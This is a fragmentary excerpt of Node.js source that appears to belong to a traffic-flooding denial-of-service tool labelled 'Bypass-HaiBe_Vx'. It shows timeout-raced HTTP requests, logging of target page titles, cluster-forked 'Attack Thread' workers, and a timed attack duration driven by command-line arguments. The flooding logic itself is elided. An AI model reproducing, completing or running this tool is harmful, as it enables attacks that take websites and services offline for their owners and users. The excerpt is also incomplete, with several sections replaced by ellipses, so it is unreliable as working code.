...
const getCurrentTime = () => {
 ...
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('[Bypass-HaiBe_Vx] Request Timed Out'));
   }, 5000);
 });
 ...
 Promise.race([axiosPromise, timeoutPromise])
   ...
   .catch((error) => {
     if (error.message === '[Bypass-HaiBe_Vx] Request Timed Out') {
       console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  Request Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  Title: ${extractedTitle} `);
     } else {
       console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  ${error.message}`);
     }
   });
}
...
`);
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  Attack Thread ${i} Started`);
 }
 console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  The Attack Has Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`${getCurrentTime()} [Bypass-HaiBe_Vx]  The Attack Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
